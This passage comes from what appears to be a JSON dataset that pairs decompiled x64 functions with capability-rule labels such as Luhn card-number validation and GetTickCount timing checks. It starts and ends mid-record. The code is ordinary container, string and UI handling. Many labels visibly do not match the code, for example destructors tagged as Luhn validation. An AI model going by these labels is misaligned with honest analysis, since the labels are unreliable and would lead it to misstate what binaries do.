uVar1 = CONCAT44(uStack1116, uStack1120) * 2 + 2;\n        iVar6 = iVar5;\n        if ((0xfff < uVar1) && (iVar6 = *(iVar5 + -8),  0x1f < (iVar5 - iVar6) - 8U)) {\ncode_r0x0001800373ad:\n            fcn.1800b3528(iVar6, uVar1 + 0x27);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18008fb24(iVar6);\n    }\n    uStack1160 = 0;\n    uVar4 = (**0x1800de730)(*(arg1 + 0x18), arg2 + 0x2559, 0x147, 0);\n    uStack1160 = 0;\n    *(arg3 + 0x20) = uVar4;\n    uVar4 = (**0x1800de730)(*(arg1 + 0x18), arg2 + 0x256d, 0x147, 0);\n    *(arg3 + 0x24) = uVar4;\n    fcn.18008fb00(uStack56 ^ auStack1192);\n    return;\n}\n",
        "token_count": 973
    },
    "18003772": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Variable defined which should be unmapped: var_29h\n\nvoid fcn.180037720(int64_t arg1, int64_t *arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ushort *arg1_00;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    char in_R8B;\n    char in_R9B;\n    uint64_t uVar6;\n    ulong var_17h;\n    uchar auStack200 [32];\n    int64_t iStack168;\n    ulong uStack160;\n    int64_t aiStack152 [2];\n    int64_t iStack136;\n    uint64_t uStack128;\n    int32_t iStack120;\n    int32_t iStack116;\n    ushort uStack112;\n    unkbyte6 Stack110;\n    int64_t iStack96;\n    uchar auStack88 [7];\n    ulong var_49h;\n    uint64_t var_41h;\n    ulong var_39h;\n    ulong var_29h;\n    ulong var_21h;\n    ulong var_19h;\n    ulong var_1h;\n    \n    uStack160 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack200;\n    fcn.18003b930(arg1);\n    iVar3 = arg2[1];\n    iVar5 = *arg2;\n    if (iVar5 != iVar3) {\n        do {\n            fcn.180037040(iVar5);\n            iVar5 = iVar5 + 0x48;\n        } while (iVar5 != iVar3);\n        iVar5 = *arg2;\n    }\n    arg2[1] = iVar5;\n    uVar6 = 0;\n    iVar3 = *(arg1 + 0xb8);\n    iVar2 = *(arg1 + 0xc0) - iVar3;\n    iVar5 = iVar2 >> 0x3f;\n    if (iVar2 / 0x48 + iVar5 != iVar5) {\n        iVar5 = 0;\n        do {\n            iVar3 = iVar3 + iVar5;\n            fcn.18000da90(aiStack152, iVar3);\n            iStack120 = *(iVar3 + 0x20);\n            iStack116 = *(iVar3 + 0x24);\n            arg1_00 = &uStack112;\n            fcn.18000da90(arg1_00, iVar3 + 0x28);\n            if ((iStack120 + iStack96 + iStack116 + iStack136 == 0) || ((in_R8B != '\\0' && (iStack116 == 0)))) {\n                if (7 < _auStack88) {\n                    iVar2 = CONCAT62(Stack110, uStack112);\n                    iVar3 = iVar2;\n                    if (0xfff < _auStack88 * 2 + 2) {\n                        iVar4 = _auStack88 * 2 + 0x29;\n                        iVar3 = *(iVar2 + -8);\n                        if (0x1f < (iVar2 - iVar3) - 8U) goto code_r0x0001800379f6;\n                    }\n                    fcn.18008fb24(iVar3);\n                }\n            }\n            else {\n                iStack120 = iStack120 + -1;\n                iStack116 = iStack116 + -1;\n                if (in_R9B != '\\0') {\n                    fcn.18000a710(arg1_00, aiStack152);\n                    fcn.18000a710(arg1_00, &uStack112);\n                }\n                iVar3 = arg2[1];\n                if (iVar3 == arg2[2]) {\n                    fcn.18003c240(arg2, iVar3, aiStack152);\n                }\n                else {\n                    iStack168 = iVar3;\n                    fcn.18000da90(iVar3, aiStack152);\n                    *(iVar3 + 0x20) = iStack120;\n                    *(iVar3 + 0x24) = iStack116;\n                    fcn.18000da90(iVar3 + 0x28, &uStack112);\n                    arg2[1] = arg2[1] + 0x48;\n                }\n                if (7 < _auStack88) {\n                    iVar2 = CONCAT62(Stack110, uStack112);\n                    iVar3 = iVar2;\n                    if (0xfff < _auStack88 * 2 + 2) {\n                        iVar4 = _auStack88 * 2 + 0x29;\n                        iVar3 = *(iVar2 + -8);\n                        if (0x1f < (iVar2 - iVar3) - 8U) goto code_r0x0001800379f6;\n                    }\n                    fcn.18008fb24(iVar3);\n                }\n            }\n            iStack96 = 0;\n            uStack112 = 0;\n            _auStack88 = 7;\n            if (7 < uStack128) {\n                iVar3 = aiStack152[0];\n                if (0xfff < uStack128 * 2 + 2) {\n                    iVar3 = *(aiStack152[0] + -8);\n                    iVar4 = uStack128 * 2 + 0x29;\n                    if (0x1f < (aiStack152[0] - iVar3) - 8U) {\ncode_r0x0001800379f6:\n                        fcn.1800b3528(iVar3, iVar4);\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(iVar3);\n            }\n            uVar6 = uVar6 + 1;\n            iVar5 = iVar5 + 0x48;\n            iVar3 = *(arg1 + 0xb8);\n        } while (uVar6 < (*(arg1 + 0xc0) - iVar3) / 0x48);\n    }\n    fcn.18008fb00(stack0xffffffffffffffb8 ^ auStack200);\n    return;\n}\n",
        "token_count": 1370
    },
    "18003b4b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003b4b0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int32_t iVar3;\n    int64_t arg1_00;\n    \n    iVar1 = *(arg1 + 0xc0);\n    arg1_00 = *(arg1 + 0xb8);\n    if (arg1_00 != iVar1) {\n        do {\n            fcn.180037040(arg1_00);\n            arg1_00 = arg1_00 + 0x48;\n        } while (arg1_00 != iVar1);\n        arg1_00 = *(arg1 + 0xb8);\n    }\n    *(arg1 + 0xc0) = arg1_00;\n    fcn.18003bf80(arg1 + 0xb8, 10);\n    fcn.18003b5c0(arg1, 0);\n    uVar2 = *(arg1 + 0xa8);\n    (**0x1800de7f0)(uVar2, 0x14e, 0, 0);\n    (**0x1800de5b8)(uVar2, 0, 0);\n    (**0x1800de778)(*(arg1 + 0xb0), 0x1800f6764);\n    uVar2 = (**0x1800de798)(*(arg1 + 0x18), 0x25c3);\n    (**0x1800de770)(uVar2, 0);\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0xa8), 0x147, 0, 0);\n    uVar2 = (**0x1800de798)(*(arg1 + 0x18), 0x25c5);\n    // WARNING: Could not recover jumptable at 0x00018003b5b8. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de770)(uVar2, 0 < iVar3);\n    return;\n}\n",
        "token_count": 456
    },
    "18003b9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/01bb0ec37f0e4f748bf40bf8ad1af4de",
            "validate payment card number using luhn algorithm with lookup table/fb60ffb548f34d1da43070d509ac9033",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.18003b9e0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    uint64_t uVar6;\n    int64_t arg1_00;\n    int32_t iVar7;\n    ulong *puVar8;\n    int64_t *piVar9;\n    int16_t *piVar10;\n    int64_t iVar11;\n    ulong *puVar12;\n    uint64_t uVar13;\n    uchar auStack184 [32];\n    int16_t iStack152;\n    unkbyte6 Stack150;\n    uint64_t uStack136;\n    uint64_t uStack128;\n    int16_t iStack80;\n    int16_t aiStack78 [3];\n    uint64_t uStack72;\n    \n    if (((*(arg1 + 0xc0) - *(arg1 + 0xb8)) / 0x48 + -1) / 10 <= *(arg1 + 0x34)) {\n        return;\n    }\n    fcn.18003b930(arg1);\n    iVar7 = *(arg1 + 0x34) + 1;\n    uStack72 = *0x180123080 ^ auStack184;\n    piVar9 = arg1 + 0xb8;\n    uVar13 = iVar7 * 10;\n    uVar6 = (*(arg1 + 0xc0) - *piVar9) / 0x48;\n    if (uVar13 < uVar6) {\n        if (uVar6 < uVar13 + 10) {\n            fcn.18003bf80(piVar9, uVar13 + 10);\n        }\n        *(arg1 + 0x34) = iVar7;\n        iVar1 = ((*(arg1 + 0xc0) - *piVar9) / 0x48 + -1) / 10;\n        bVar2 = iVar1 + 1 < 3;\n        uVar5 = (**0x1800de798)(*(arg1 + 0x18), 0x259e);\n        (**0x1800de770)(uVar5, bVar2);\n        iVar7 = *(arg1 + 0x34);\n        uVar5 = (**0x1800de798)(*(arg1 + 0x18), 0x2524);\n        (**0x1800de770)(uVar5, 0 < iVar7);\n        iVar7 = *(arg1 + 0x34);\n        uVar5 = (**0x1800de798)(*(arg1 + 0x18), 0x2525);\n        (**0x1800de770)(uVar5, iVar7 < iVar1);\n        uVar5 = (**0x1800de798)(*(arg1 + 0x18), 0x2522);\n        (**0x1800de770)(uVar5, bVar2);\n        iVar7 = *(arg1 + 0x34);\n        uVar5 = (**0x1800de798)(*(arg1 + 0x18), 0x2523);\n        (**0x1800de770)(uVar5, 0 < iVar7);\n        iVar11 = uVar13 * 0x48;\n        iVar7 = 0x2581;\n        do {\n            puVar12 = *(arg1 + 0xb8) + iVar11;\n            puVar8 = puVar12;\n            if (7 < puVar12[3]) {\n                puVar8 = *puVar12;\n            }\n            (**0x1800de788)(*(arg1 + 0x18), iVar7 + -0x3c, puVar8);\n            piVar9 = puVar12 + 5;\n            if (7 < puVar12[8]) {\n                piVar9 = *piVar9;\n            }\n            (**0x1800de788)(*(arg1 + 0x18), iVar7, piVar9);\n            iVar1 = *(puVar12 + 4);\n            uVar5 = (**0x1800de798)(*(arg1 + 0x18), iVar7 + -0x28);\n            (**0x1800de7f0)(uVar5, 0x14e, iVar1, 0);\n            (**0x1800de5b8)(uVar5, 0, 0);\n            fcn.180036af0(arg1, iVar7 - 0x2581);\n            iVar1 = *(puVar12 + 0x24);\n            uVar5 = (**0x1800de798)(*(arg1 + 0x18), iVar7 + -0x14);\n            (**0x1800de7f0)(uVar5, 0x14e, iVar1, 0);\n            (**0x1800de5b8)(uVar5, 0);\n            uVar13 = uVar13 + 1;\n            piVar10 = aiStack78;\n            iVar11 = iVar11 + 0x48;\n            uVar6 = uVar13;\n            do {\n                piVar10 = piVar10 + -1;\n                uStack136 = uVar6 / 10;\n                iStack152 = uStack136;\n                *piVar10 = uVar6 + iStack152 * -10 + 0x30;\n                uVar6 = uStack136;\n            } while (uStack136 != 0);\n            uStack128 = 7;\n            if (piVar10 != aiStack78) {\n                fcn.180010d70(&iStack152, piVar10, aiStack78 - piVar10 >> 1);\n            }\n            piVar10 = &iStack152;\n            if (7 < uStack128) {\n                piVar10 = CONCAT62(Stack150, iStack152);\n            }\n            (**0x1800de788)(*(arg1 + 0x18), iVar7 + -0x50, piVar10);\n            if (7 < uStack128) {\n                iVar4 = CONCAT62(Stack150, iStack152);\n                arg1_00 = iVar4;\n                if (0xfff < uStack128 * 2 + 2) {\n                    arg1_00 = *(iVar4 + -8);\n                    if (0x1f < (iVar4 - arg1_00) - 8U) {\n                        fcn.1800b3528();\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(arg1_00);\n            }\n            iVar1 = iVar7 + -0x2580;\n            iVar7 = iVar7 + 1;\n        } while (iVar1 < 10);\n        fcn.180036d10(arg1, 0);\n    }\n    fcn.18008fb00(uStack72 ^ auStack184);\n    return;\n}\n",
        "token_count": 1517
    },
    "18003bb1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003bb10(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    if (0 < *(arg1 + 0x34)) {\n        iVar1 = *(arg1 + 0x34) * 10;\n        iVar2 = *(arg1 + 0xc0);\n        arg1_00 = *(arg1 + 0xb8) + iVar1 * 0x48;\n        iVar1 = *(arg1 + 0xb8) + (iVar1 + 10) * 0x48;\n        iVar3 = arg1_00;\n        if (iVar1 != iVar2) {\n            do {\n                fcn.18000d960(arg1_00, iVar1);\n                *(arg1_00 + 0x20) = *(iVar1 + 0x20);\n                *(arg1_00 + 0x24) = *(iVar1 + 0x24);\n                fcn.18000d960(arg1_00 + 0x28, iVar1 + 0x28);\n                arg1_00 = arg1_00 + 0x48;\n                iVar1 = iVar1 + 0x48;\n            } while (iVar1 != iVar2);\n            iVar2 = *(arg1 + 0xc0);\n            iVar3 = arg1_00;\n        }\n        for (; arg1_00 != iVar2; arg1_00 = arg1_00 + 0x48) {\n            fcn.180037040(arg1_00);\n        }\n        *(arg1 + 0xc0) = iVar3;\n        fcn.18003b5c0(arg1, *(arg1 + 0x34) - 1);\n    }\n    return;\n}\n",
        "token_count": 400
    },
    "18003bbe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.18003bbe0(ulong noname_0, ulong arg2, int64_t arg3)\n\n{\n    uint16_t uVar1;\n    uint64_t uVar2;\n    ulong uVar3;\n    int32_t iVar4;\n    \n    uVar2 = (**0x1800de780)();\n    uVar2 = uVar2 & 0xffffffff;\n    if (0x9c < arg3 - 0x21U) {\n        return 0;\n    }\n    // switch table (157 cases) at 0x18003beb0\n    switch(*(*(arg3 + 0x18003beb3) * 4 + 0x18003beb0) + 0x180000000) {\n    case 0x18003bc24:\n        uVar3 = 0x11;\n        uVar1 = (**0x1800de610)();\n        if ((uVar1 & 0x8000) != 0) {\n            fcn.1800373c0(0x1801240b0, *0x1801240e0, *0x1801240e0 + 1);\n            return 1;\n        }\n        fcn.180037660(uVar3, uVar2, *0x1801240e0 + 1);\n        return 1;\n    case 0x18003bc7a:\n        uVar3 = 0x11;\n        uVar1 = (**0x1800de610)();\n        if ((uVar1 & 0x8000) != 0) {\n            fcn.1800373c0(0x1801240b0, *0x1801240e0, *0x1801240e0 - 1);\n            return 1;\n        }\n        fcn.180037660(uVar3, uVar2, *0x1801240e0 - 1);\n        return 1;\n    case 0x18003bcd0:\n        uVar2 = (**0x1800de610)(0x11);\n        if ((uVar2 & 0x8000) == 0) {\n            return 0;\n        }\n        iVar4 = 0x2545;\n        break;\n    case 0x18003bd11:\n        uVar2 = (**0x1800de610)(0x11);\n        if ((uVar2 & 0x8000) == 0) {\n            return 1;\n        }\n        iVar4 = 0x258a;\n        break;\n    case 0x18003bd2d:\n        uVar1 = (**0x1800de610)(0x11);\n        if ((uVar1 & 0x8000) != 0) {\n            iVar4 = *0x1801240e4;\n            if (0 < iVar4) {\n                fcn.18003b930(0x1801240b0);\n                iVar4 = *0x1801240e4;\n            }\n            fcn.18003b5c0(0x1801240b0, iVar4 - 1);\n            return 1;\n        }\n        iVar4 = uVar2 - *0x1801240e0;\n        break;\n    case 0x18003bd89:\n        uVar1 = (**0x1800de610)(0x11);\n        if ((uVar1 & 0x8000) != 0) {\n            fcn.18003b9e0(0x1801240b0);\n            return 1;\n        }\n        iVar4 = (uVar2 - *0x1801240e0) + 9;\n        break;\n    case 0x18003bdc5:\n        uVar1 = (**0x1800de610)(0x11);\n        if (((uVar1 & 0x8000) != 0) && (uVar1 = (**0x1800de610)(0x10),  (uVar1 & 0x8000) != 0)) {\n            fcn.18003ba50(0x1801240b0);\n            return 1;\n        }\n        uVar2 = (**0x1800de610)(0x11);\n        if ((uVar2 & 0x8000) != 0) {\n            fcn.180036e80(0x1801240b0, *0x1801240e0);\n            return 1;\n        }\n        return 0;\n    case 0x18003be36:\n        uVar1 = (**0x1800de610)(0x11);\n        if (((uVar1 & 0x8000) != 0) && (uVar1 = (**0x1800de610)(0x10),  (uVar1 & 0x8000) != 0)) {\n            fcn.18003bb10(0x1801240b0);\n            return 1;\n        }\n        uVar2 = (**0x1800de610)(0x11);\n        if ((uVar2 & 0x8000) == 0) {\n            return 0;\n        }\n        fcn.180037100(0x1801240b0, *0x1801240e0);\n        return 1;\n    case 0x18003bea3:\n        return 0;\n    }\n    uVar3 = (**0x1800de798)(*0x1801240c8, iVar4);\n    (**0x1800de6f0)(uVar3);\n    return 1;\n}\n",
        "token_count": 1213
    },
    "18003c0b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003c0b0(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.180037040(arg1_00);\n                arg1_00 = arg1_00 + 0x48;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        uVar2 = ((arg1[2] - arg1_00) / 0x48) * 0x48;\n        iVar3 = arg1_00;\n        if (0xfff < uVar2) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(arg1[2] - arg1_00, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 336
    },
    "18003c17": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003c170(ulong noname_0, int64_t arg2, int64_t arg3)\n\n{\n    if (arg2 != arg3) {\n        do {\n            fcn.180037040(arg2);\n            arg2 = arg2 + 0x48;\n        } while (arg2 != arg3);\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "18003c1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.18003c1d0(ulong noname_0, int64_t arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uint *puVar5;\n    ulong arg1;\n    \n    iVar3 = arg2;\n    if (0xfff < arg3 * 0x48) {\n        iVar3 = *(arg2 + -8);\n        if (0x1f < (arg2 - iVar3) - 8U) {\n            fcn.1800b3528(iVar3, arg3 * 0x48 + 0x27);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n    }\n    uVar4 = 0;\n    if ((iVar3 != 0) && (arg1 = *0x180129fa0,  uVar4 = (**0x1800de208)(*0x180129fa0, 0, iVar3),  uVar4 == 0)) {\n        puVar5 = fcn.1800ba53c(arg1);\n        uVar2 = (**0x1800de400)();\n        uVar4 = fcn.1800ba484(uVar2);\n        *puVar5 = uVar4;\n    }\n    return uVar4;\n}\n",
        "token_count": 311
    },
    "18003c42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18003c420(ulong *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    ulong *puVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uchar auStack344 [32];\n    int64_t iStack312;\n    uint uStack304;\n    uint uStack296;\n    uint uStack288;\n    ulong uStack280;\n    uchar auStack264 [64];\n    uchar auStack200 [64];\n    int64_t iStack136;\n    ulong uStack128;\n    int64_t iStack120;\n    uint64_t uStack24;\n    \n    uStack280 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack344;\n    iVar4 = arg1[2];\n    puVar3 = arg1;\n    if (0xf < arg1[3]) {\n        puVar3 = *arg1;\n    }\n    if (0xf < arg1[3]) {\n        arg1 = *arg1;\n    }\n    iVar1 = *arg2;\n    if (iVar1 != 0) {\n        fcn.1800ae290(auStack264, 0, 0xe8);\n        uStack296 = *(iVar1 + 0x20);\n        uStack304 = *(iVar1 + 0x28);\n        uStack288 = 0x10;\n        iStack312 = iVar1;\n        fcn.1800162e0(auStack264, arg1, puVar3 + iVar4, arg2 + 1);\n        fcn.180031a00(auStack264, 0);\n        if (iStack136 != 0) {\n            uVar5 = iStack120 - iStack136 & 0xfffffffffffffff0;\n            iVar4 = iStack136;\n            if (0xfff < uVar5) {\n                iVar4 = *(iStack136 + -8);\n                if (0x1f < (iStack136 - iVar4) - 8U) {\n                    fcn.1800b3528(iVar4, uVar5 + 0x27);\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n            }\n            fcn.18008fb24(iVar4);\n            iStack136 = 0;\n            uStack128 = 0;\n            iStack120 = 0;\n        }\n        fcn.1800161d0(auStack200);\n        fcn.1800161d0(auStack264);\n    }\n    fcn.18008fb00(uStack24 ^ auStack344);\n    return;\n}\n",
        "token_count": 582
    },
    "18003c58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003c580(int64_t arg1, ulong *arg2, uint *arg3, int64_t arg4)\n\n{\n    uint *puVar1;\n    uint64_t uVar2;\n    code *pcVar3;\n    ulong uVar4;\n    int64_t arg1_00;\n    uint *puVar5;\n    uint *puVar6;\n    uchar auStack184 [32];\n    ulong uStack152;\n    uint *puStack144;\n    int64_t aiStack136 [3];\n    uint64_t uStack112;\n    uint uStack104;\n    uint uStack100;\n    int64_t aiStack96 [3];\n    uint64_t uStack72;\n    uint64_t uStack56;\n    \n    uStack152 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack184;\n    puVar6 = *(arg1 + 8);\n    if (puVar6 == *(arg1 + 0x10)) {\n        uVar4 = fcn.18003c240(arg1, arg3, arg4);\n        *arg2 = uVar4;\n    }\n    else {\n        if (arg3 == puVar6) {\n            puStack144 = puVar6;\n            fcn.18000da90(puVar6, arg4);\n            puVar6[8] = *(arg4 + 0x20);\n            puVar6[9] = *(arg4 + 0x24);\n            fcn.18000da90(puVar6 + 10, arg4 + 0x28);\n            *(arg1 + 8) = *(arg1 + 8) + 0x48;\n            *arg2 = arg3;\n            goto code_r0x00018003c792;\n        }\n        fcn.18000da90(aiStack136, arg4);\n        uStack104 = *(arg4 + 0x20);\n        uStack100 = *(arg4 + 0x24);\n        fcn.18000da90(aiStack96, arg4 + 0x28);\n        puVar5 = puVar6 + -0x12;\n        *(puVar6 + 4) = 0;\n        *(puVar6 + 6) = 0;\n        *puVar6 = *puVar5;\n        puVar6[1] = puVar6[-0x11];\n        puVar6[2] = puVar6[-0x10];\n        puVar6[3] = puVar6[-0xf];\n        puVar6[4] = puVar6[-0xe];\n        puVar6[5] = puVar6[-0xd];\n        puVar6[6] = puVar6[-0xc];\n        puVar6[7] = puVar6[-0xb];\n        *(puVar6 + -0xe) = 0;\n        *(puVar6 + -0xc) = 7;\n        *puVar5 = 0;\n        puVar6[8] = puVar6[-10];\n        puVar6[9] = puVar6[-9];\n        *(puVar6 + 0xe) = 0;\n        *(puVar6 + 0x10) = 0;\n        puVar6[10] = puVar6[-8];\n        puVar6[0xb] = puVar6[-7];\n        puVar6[0xc] = puVar6[-6];\n        puVar6[0xd] = puVar6[-5];\n        puVar6[0xe] = puVar6[-4];\n        puVar6[0xf] = puVar6[-3];\n        puVar6[0x10] = puVar6[-2];\n        puVar6[0x11] = puVar6[-1];\n        *(puVar6 + -4) = 0;\n        *(puVar6 + -2) = 7;\n        *(puVar6 + -8) = 0;\n        *(arg1 + 8) = *(arg1 + 8) + 0x48;\n        if (puVar5 != arg3) {\n            puVar5 = puVar6 + -0x1c;\n            puVar6 = puVar6 + 9;\n            do {\n                fcn.18000d960(puVar6 + -0x1b, puVar5 + -8);\n                puVar6[-0x13] = *puVar5;\n                puVar6[-0x12] = puVar5[1];\n                fcn.18000d960(puVar6 + -0x11, puVar5 + 2);\n                puVar5 = puVar5 + -0x12;\n                puVar1 = puVar6 + -0x2d;\n                puVar6 = puVar6 + -0x12;\n            } while (puVar1 != arg3);\n        }\n        fcn.18000d960(arg3, aiStack136);\n        arg3[8] = uStack104;\n        arg3[9] = uStack100;\n        fcn.18000d960(arg3 + 10, aiStack96);\n        if (7 < uStack72) {\n            uVar2 = uStack72 * 2 + 2;\n            arg1_00 = aiStack96[0];\n            if ((0xfff < uVar2) && (arg1_00 = *(aiStack96[0] + -8),  0x1f < (aiStack96[0] - arg1_00) - 8U))\n            goto code_r0x00018003c7bc;\n            fcn.18008fb24(arg1_00);\n        }\n        if (7 < uStack112) {\n            uVar2 = uStack112 * 2 + 2;\n            arg1_00 = aiStack136[0];\n            if ((0xfff < uVar2) && (arg1_00 = *(aiStack136[0] + -8),  0x1f < (aiStack136[0] - arg1_00) - 8U)) {\ncode_r0x00018003c7bc:\n                fcn.1800b3528(arg1_00, uVar2 + 0x27);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            fcn.18008fb24(arg1_00);\n        }\n        *arg2 = arg3;\n    }\ncode_r0x00018003c792:\n    fcn.18008fb00(uStack56 ^ auStack184);\n    return;\n}\n",
        "token_count": 1440
    },
    "18003c7d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003c7d0(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.180037040(arg1_00);\n                arg1_00 = arg1_00 + 0x48;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        uVar2 = ((arg1[2] - arg1_00) / 0x48) * 0x48;\n        iVar3 = arg1_00;\n        if (0xfff < uVar2) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(arg1[2] - arg1_00, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n    }\n    *arg1 = arg2;\n    arg1[1] = arg2 + arg3 * 0x48;\n    arg1[2] = arg2 + arg4 * 0x48;\n    return;\n}\n",
        "token_count": 366
    },
    "18003d58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18003d580(int64_t arg1)\n\n{\n    code *pcVar1;\n    ulong *puVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    char cVar5;\n    ulong arg2;\n    int64_t arg1_00;\n    ulong *puVar6;\n    uint64_t uVar7;\n    uchar auStack200 [32];\n    ulong *puStack168;\n    ulong uStack152;\n    uint uStack144;\n    uint uStack140;\n    uint64_t uStack136;\n    uint64_t uStack128;\n    ulong uStack120;\n    ulong *puStack112;\n    int64_t aiStack104 [3];\n    uint64_t uStack80;\n    ushort uStack72;\n    unkbyte6 Stack70;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint64_t uStack40;\n    \n    uStack120 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack200;\n    uStack56 = *0x180101900;\n    uStack52 = *0x180101904;\n    uStack48 = *0x180101908;\n    uStack44 = *0x18010190c;\n    uStack72 = 0;\n    puStack168 = &uStack72;\n    cVar5 = fcn.18000af20(arg1, *(arg1 + 0x18));\n    uVar4 = CONCAT44(uStack44, uStack48);\n    puVar2 = CONCAT62(Stack70, uStack72);\n    if (cVar5 != '\\0') {\n        puStack112 = &uStack152;\n        uStack136 = 0;\n        uStack128 = 0;\n        puVar6 = &uStack72;\n        if (7 < uVar4) {\n            puVar6 = puVar2;\n        }\n        uVar3 = CONCAT44(uStack52, uStack56);\n        if (uVar3 < 8) {\n            uStack152 = *puVar6;\n            uStack144 = *(puVar6 + 1);\n            uStack140 = *(puVar6 + 0xc);\n            uVar7 = 7;\n        }\n        else {\n            uVar7 = uVar3 | 7;\n            if (0x7ffffffffffffffe < uVar7) {\n                uVar7 = 0x7ffffffffffffffe;\n            }\n            uStack152 = fcn.180011cf0(&uStack152, uVar7 + 1);\n            fcn.1800ade80(uStack152, puVar6, uVar3 * 2 + 2);\n        }\n        uStack136 = uVar3;\n        uStack128 = uVar7;\n        arg2 = fcn.18003d760(arg1, aiStack104);\n        fcn.18000b170(arg1, arg2, &uStack152);\n        if (7 < uStack80) {\n            arg1_00 = aiStack104[0];\n            if ((0xfff < uStack80 * 2 + 2) && (arg1_00 = *(aiStack104[0] + -8),  0x1f < (aiStack104[0] - arg1_00) - 8U))\n            goto code_r0x00018003d74b;\n            fcn.18008fb24(arg1_00);\n        }\n    }\n    if (7 < uVar4) {\n        puVar6 = puVar2;\n        if (0xfff < uVar4 * 2 + 2) {\n            puVar6 = puVar2[-1];\n            if (0x1f < puVar2 + (-8 - puVar6)) {\n                